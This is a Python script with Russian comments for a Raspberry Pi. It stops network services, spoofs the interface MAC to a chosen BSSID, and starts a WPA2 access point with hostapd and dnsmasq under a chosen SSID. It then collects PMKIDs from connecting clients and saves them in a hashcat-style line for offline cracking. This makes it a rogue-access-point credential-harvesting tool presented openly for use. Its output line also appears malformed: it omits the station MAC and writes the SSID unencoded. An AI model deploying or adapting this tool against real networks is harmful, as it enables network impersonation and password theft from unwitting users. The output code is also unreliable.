#!/usr/bin/env python3
"""
Захват PMKID на Raspberry Pi с драйвером brcmfmac.
Не использует iw set type ap, полагается на hostapd.
Запуск: sudo python3 ap_pmkid.py [SSID] [BSSID] [PASSWORD] [OUTPUT_FILE]
"""

import subprocess, sys, time, os, signal, re

DEFAULT_SSID = "TestAP"
DEFAULT_BSSID = "00:11:22:33:44:55"
DEFAULT_PASS = "password123"
INTERFACE = "wlan0"
GATEWAY_IP = "192.168.4.1"
CTRL_DIR = "/var/run/hostapd"
CTRL_IFACE = f"{CTRL_DIR}/{INTERFACE}"
DHCP_RANGE_START = "192.168.4.2"
DHCP_RANGE_END = "192.168.4.20"

hostapd_proc = None
dnsmasq_proc = None
original_mac = ""
saved_resolv_conf = None

def cleanup():
    global hostapd_proc, dnsmasq_proc
    print("\n[!] Завершение работы...")
    for proc, name in [(hostapd_proc, "hostapd"), (dnsmasq_proc, "dnsmasq")]:
        if proc:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
            print(f"[+] {name} остановлен")

    for f in ["/tmp/hostapd_pmkid.conf", "/tmp/dnsmasq_pmkid.conf"]:
        if os.path.exists(f):
            os.remove(f)

    # Убираем IP, выключаем интерфейс, возвращаем MAC
    subprocess.run(f"ip addr flush dev {INTERFACE}", shell=True, check=False)
    subprocess.run(f"ip link set {INTERFACE} down", shell=True, check=False)
    subprocess.run(f"ip link set {INTERFACE} address {original_mac}", shell=True, check=False)
    subprocess.run(f"iw dev {INTERFACE} set type managed", shell=True, check=False)
    subprocess.run(f"ip link set {INTERFACE} up", shell=True, check=False)

    print("[*] Возобновление сетевых служб...")
    for service in ["NetworkManager", "dhcpcd", "wpa_supplicant"]:
        try:
            subprocess.run(f"systemctl start {service}", shell=True, check=False)
        except:
            pass

    if saved_resolv_conf and os.path.exists(saved_resolv_conf):
        subprocess.run(f"cp {saved_resolv_conf} /etc/resolv.conf", shell=True, check=False)

    print("[+] Система возвращена в исходное состояние.")

def signal_handler(sig, frame):
    cleanup()
    sys.exit(0)

def prepare_interface():
    global original_mac, saved_resolv_conf
    original_mac = subprocess.check_output(
        f"cat /sys/class/net/{INTERFACE}/address", shell=True
    ).decode().strip()
    print(f"[*] Исходный MAC: {original_mac}")

    print("[*] Остановка NetworkManager, dhcpcd, wpa_supplicant...")
    for service in ["NetworkManager", "dhcpcd", "wpa_supplicant"]:
        subprocess.run(f"systemctl stop {service}", shell=True, check=False)
    time.sleep(1)

    if os.path.exists("/etc/resolv.conf"):
        saved_resolv_conf = "/tmp/resolv.conf.bak"
        subprocess.run(f"cp /etc/resolv.conf {saved_resolv_conf}", shell=True, check=False)

    subprocess.run(f"ip link set {INTERFACE} up", shell=True, check=True)
    print(f"[+] Интерфейс {INTERFACE} поднят, hostapd сам переведёт в AP")

def configure_ap(ssid, bssid, passphrase):
    global hostapd_proc, dnsmasq_proc

    subprocess.run(f"ip link set {INTERFACE} down", shell=True, check=True)
    subprocess.run(f"ip link set {INTERFACE} address {bssid}", shell=True, check=True)
    subprocess.run(f"ip link set {INTERFACE} up", shell=True, check=True)

    subprocess.run(f"ip addr flush dev {INTERFACE}", shell=True, check=False)
    subprocess.run(f"ip addr add {GATEWAY_IP}/24 dev {INTERFACE}", shell=True, check=True)

    hostapd_conf = f"""interface={INTERFACE}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase={passphrase}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
"""
    with open("/tmp/hostapd_pmkid.conf", "w") as f:
        f.write(hostapd_conf)

    dnsmasq_conf = f"""interface={INTERFACE}
dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},255.255.255.0,24h
dhcp-option=3,{GATEWAY_IP}
dhcp-option=6,{GATEWAY_IP}
no-resolv
log-queries
log-dhcp
"""
    with open("/tmp/dnsmasq_pmkid.conf", "w") as f:
        f.write(dnsmasq_conf)

    os.makedirs(CTRL_DIR, exist_ok=True)

    print("[*] Запуск hostapd...")
    hostapd_cmd = ["hostapd", "-g", CTRL_IFACE, "/tmp/hostapd_pmkid.conf"]
    hostapd_proc = subprocess.Popen(hostapd_cmd, stderr=subprocess.PIPE, text=True)
    time.sleep(3)
    poll = hostapd_proc.poll()
    if poll is not None:
        _, err = hostapd_proc.communicate()
        print(f"[!] hostapd завершился с кодом {poll}:")
        print(err)
        sys.exit(1)
    print("[+] hostapd запущен успешно")

    dnsmasq_cmd = f"dnsmasq -C /tmp/dnsmasq_pmkid.conf --no-daemon"
    dnsmasq_proc = subprocess.Popen(dnsmasq_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"[+] Точка доступа '{ssid}' запущена (BSSID: {bssid})")

def get_pmkid_list():
    try:
        res = subprocess.run(
            f"hostapd_cli -p {CTRL_DIR} -i {INTERFACE} all_sta",
            shell=True, capture_output=True, text=True, timeout=5
        )
        output = res.stdout
    except:
        return []
    entries = re.split(r"\n(?=[0-9a-fA-F:]{17}\n)", output)
    pmkids = []
    for entry in entries:
        mac_match = re.match(r"([0-9a-fA-F:]{17})", entry)
        if not mac_match:
            continue
        sta_mac = mac_match.group(1)
        pmkid_match = re.search(r"^pmkid=([0-9a-fA-F]{32})$", entry, re.MULTILINE)
        if pmkid_match:
            pmkids.append((sta_mac, pmkid_match.group(1)))
    return pmkids

def save_entry(ssid, bssid, sta_mac, pmkid, output_file):
    line = f"WPA*01*{pmkid}*{bssid}*{ssid}***"
    with open(output_file, "a") as f:
        f.write(line + "\n")
        f.flush()                     # немедленная запись на диск
    print(f"[✓] Сохранено в {output_file}: {line}")

def main_loop(output_file, ssid, bssid):
    print("[*] Ожидание подключений и захват PMKID...")
    seen = set()
    while True:
        try:
            pmkids = get_pmkid_list()
            for sta, pmkid in pmkids:
                if sta not in seen:
                    seen.add(sta)
                    print(f"[+] Клиент {sta} -> PMKID: {pmkid}")
                    save_entry(ssid, bssid, sta, pmkid, output_file)
            time.sleep(2)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[!] Ошибка опроса: {e}")
            time.sleep(5)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Требуются права root. Запускайте через sudo.")
        sys.exit(1)

    args = sys.argv[1:]
    ssid = args[0] if len(args) > 0 else DEFAULT_SSID
    bssid = args[1] if len(args) > 1 else DEFAULT_BSSID
    passphrase = args[2] if len(args) > 2 else DEFAULT_PASS
    output_file = args[3] if len(args) > 3 else f"pmkids_{ssid}.txt"

    print(f"[*] SSID: {ssid}, BSSID: {bssid}, файл: {output_file}")

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        prepare_interface()
        configure_ap(ssid, bssid, passphrase)
        main_loop(output_file, ssid, bssid)
    except Exception as e:
        print(f"Критическая ошибка: {e}")
    finally:
        cleanup()
